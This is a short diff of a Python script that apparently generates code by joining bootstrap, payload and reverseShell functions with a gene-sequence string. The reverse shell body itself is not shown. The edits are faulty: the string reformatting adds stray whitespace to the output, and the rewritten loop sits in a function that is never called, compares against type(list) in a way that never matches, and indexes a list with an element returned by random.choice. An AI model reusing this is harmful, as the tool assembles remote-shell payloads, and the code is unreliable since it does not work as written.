@@ -105,7 +105,14 @@ def reverseShell():
 
 
 def compiled_code():
-    return(f"{bootstrap()}{print_the_thing()}{payload()}{reverseShell()}{print_the_thing()}{geneSequence}")
+    return(
+        f"{bootstrap()}  \
+        {print_the_thing()}  \
+        {payload()}  \
+        {reverseShell()}  \
+        {print_the_thing()}  \
+        {geneSequence}  \
+        ")
 
 
 if __name__ == "__main__":
@@ -141,10 +148,16 @@ if __name__ == "__main__":
         "f"
     ]
 
-    # print(resolver(n_dimensional))
-    for i in n_dimensional:
-        var = random.randrange(len(i))
-        print(i[var])
+    def n_dimensional_nexus(list):
+        # print(resolver(n_dimensional))
+        for i in n_dimensional:
+            if i is type(list):
+                n_dimensional_nexus(i)
+            else:
+                var = random.choice(i)
+                print(i[var])
+            # var = random.randrange(len(i))
+            # print(i[var])
     print("############################################################")
     print("### actual output program                                ###")
     print("############################################################")
